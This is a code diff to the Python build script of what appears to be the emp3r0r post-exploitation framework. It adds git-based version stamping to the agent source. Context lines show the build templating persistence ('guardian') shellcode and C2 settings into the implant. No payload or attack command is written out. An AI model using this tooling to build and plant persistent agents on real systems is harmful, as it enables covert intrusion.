@@ -44,6 +44,7 @@ class GoBuild:
         self.CC_OTHER_NAMES = cc_other_names
         self.INDICATOR = cc_indicator
         self.UUID = str(uuid.uuid1())
+        self.VERSION = get_version()
 
         # agent root directory
 
@@ -128,6 +129,9 @@ class GoBuild:
         restore tags in the source
         '''
 
+        # version
+        sed("./internal/agent/def.go",
+            f"Version = \"{self.VERSION}\"", "Version = \"[emp3r0r_version_string]\"")
         # agent root path
         sed("./internal/agent/def.go",
             self.AgentRoot, "[agent_root]")
@@ -156,6 +160,9 @@ class GoBuild:
         modify some tags in the source
         '''
 
+        # version
+        sed("./internal/agent/def.go",
+            "Version = \"[emp3r0r_version_string]\"", f"Version = \"{self.VERSION}\"")
         # guadian shellcode
         sed("./internal/agent/def.go",
             "[persistence_shellcode]", CACHED_CONF['guadian_shellcode'])
@@ -400,6 +407,26 @@ def gen_guardian_shellcode(path):
         return "N/A"
 
     return shellcode
+
+
+def get_version():
+    '''
+    print current version
+    '''
+    try:
+        check = "git describe --tags"
+        out = subprocess.check_output(
+            ["/bin/sh", "-c", check],
+            stderr=subprocess.STDOUT, timeout=3)
+    except KeyboardInterrupt:
+        return ""
+    except BaseException:
+        check = "git describe --always"
+        out = subprocess.check_output(
+            ["/bin/sh", "-c", check],
+            stderr=subprocess.STDOUT, timeout=3)
+
+    return out.decode("utf-8").strip()
 
 
 # command line args
